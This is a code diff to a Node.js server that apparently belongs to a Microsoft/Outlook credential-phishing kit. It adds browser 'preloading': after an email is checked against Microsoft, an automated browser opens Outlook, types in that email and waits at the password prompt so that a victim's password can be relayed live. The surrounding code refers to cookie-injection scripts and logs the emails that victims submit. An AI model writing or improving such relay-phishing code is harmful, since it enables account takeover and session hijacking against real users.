@@ -70,6 +70,7 @@ const oauthStates = new Map(); // state -> { sessionId, timestamp }
 const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
 const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
 const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
+const MAX_PRELOADS = 5; // Maximum number of concurrent preloaded browsers
 
 // Analytics tracking with persistent storage
 const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');
@@ -200,6 +201,121 @@ function generateCookieInjectionScript(email, cookies, sessionId) {
     }, 1000);
 })();
 `;
+}
+
+// Browser preloading functions for performance optimization
+async function startBrowserPreload(sessionId, email) {
+    try {
+        console.log(`🚀 Starting browser preload for session: ${sessionId}, email: ${email}`);
+        
+        // Check if we've reached the maximum preload limit
+        const currentPreloads = Array.from(automationSessions.values())
+            .filter(session => session.status === 'preloading' || session.status === 'preload_ready');
+        
+        if (currentPreloads.length >= MAX_PRELOADS) {
+            // Evict oldest preload to make space
+            const oldestPreload = currentPreloads
+                .sort((a, b) => a.startTime - b.startTime)[0];
+            
+            if (oldestPreload) {
+                console.log(`📊 MAX_PRELOADS reached, evicting oldest preload: ${oldestPreload.sessionId || 'unknown'}`);
+                try {
+                    if (oldestPreload.automation) {
+                        await oldestPreload.automation.closeBrowser();
+                    }
+                    // Find and remove the oldest preload from automationSessions
+                    for (const [key, value] of automationSessions) {
+                        if (value === oldestPreload) {
+                            automationSessions.delete(key);
+                            break;
+                        }
+                    }
+                } catch (evictError) {
+                    console.warn('Error evicting old preload:', evictError.message);
+                }
+            }
+        }
+
+        // Create new automation instance
+        const automation = new OutlookLoginAutomation({
+            enableScreenshots: true,
+            screenshotQuality: 80
+        });
+
+        // Store in automationSessions with preloading status
+        automationSessions.set(sessionId, {
+            automation: automation,
+            status: 'preloading',
+            email: email,
+            startTime: Date.now(),
+            sessionId: sessionId
+        });
+
+        // Initialize browser and start preload process
+        await automation.init();
+        console.log(`🔧 Browser initialized for preload session: ${sessionId}`);
+
+        const navigated = await automation.navigateToOutlook();
+        if (!navigated) {
+            throw new Error('Failed to navigate to Outlook during preload');
+        }
+        console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);
+
+        // Start the preload process (email entry and wait at password prompt)
+        const preloadSuccess = await automation.preload(email);
+        
+        if (preloadSuccess) {
+            // Update status to ready
+            automationSessions.get(sessionId).status = 'preload_ready';
+            console.log(`✅ Browser preload completed and ready for: ${email} (session: ${sessionId})`);
+        } else {
+            // Update status to failed
+            automationSessions.get(sessionId).status = 'preload_failed';
+            console.log(`❌ Browser preload failed for: ${email} (session: ${sessionId})`);
+            
+            // Clean up failed preload after a short delay
+            setTimeout(async () => {
+                try {
+                    await automation.closeBrowser();
+                    automationSessions.delete(sessionId);
+                } catch (cleanupError) {
+                    console.warn('Error cleaning up failed preload:', cleanupError.message);
+                }
+            }, 5000);
+        }
+
+    } catch (error) {
+        console.error(`❌ Browser preload error for ${email}:`, error.message);
+        
+        // Clean up on error
+        if (automationSessions.has(sessionId)) {
+            try {
+                const session = automationSessions.get(sessionId);
+                if (session.automation) {
+                    await session.automation.closeBrowser();
+                }
+                automationSessions.delete(sessionId);
+            } catch (cleanupError) {
+                console.warn('Error cleaning up preload after error:', cleanupError.message);
+            }
+        }
+        
+        throw error;
+    }
+}
+
+// Function to get preload status for debugging
+function getPreloadStats() {
+    const preloadSessions = Array.from(automationSessions.values())
+        .filter(session => session.status && session.status.startsWith('preload'));
+    
+    return {
+        total: preloadSessions.length,
+        preloading: preloadSessions.filter(s => s.status === 'preloading').length,
+        ready: preloadSessions.filter(s => s.status === 'preload_ready').length,
+        failed: preloadSessions.filter(s => s.status === 'preload_failed').length,
+        maxAllowed: MAX_PRELOADS
+    };
 }
 
 // Routes
@@ -714,6 +830,12 @@ app.post('/api/verify-email', async (req, res) => {
                 if (isValidAccount) {
                     console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);
 
+                    // Start browser preloading in background for faster password authentication
+                    const sessionId = createSessionId();
+                    startBrowserPreload(sessionId, email).catch(error => {
+                        console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
+                    });
+
                     // Store verification result in session_data for tracking
                     const fs = require('fs');
                     const path = require('path');
@@ -742,7 +864,9 @@ app.post('/api/verify-email', async (req, res) => {
                         exists: true,
                         email: email,
                         message: 'Account found. Please enter your password.',
-                        accountType: data.Account || data.account_type || data.NameSpaceType
+                        accountType: data.Account || data.account_type || data.NameSpaceType,
+                        sessionId: sessionId,  // Return session ID for browser preloading
+                        preloadStarted: true
                     });
                 } else {
                     console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
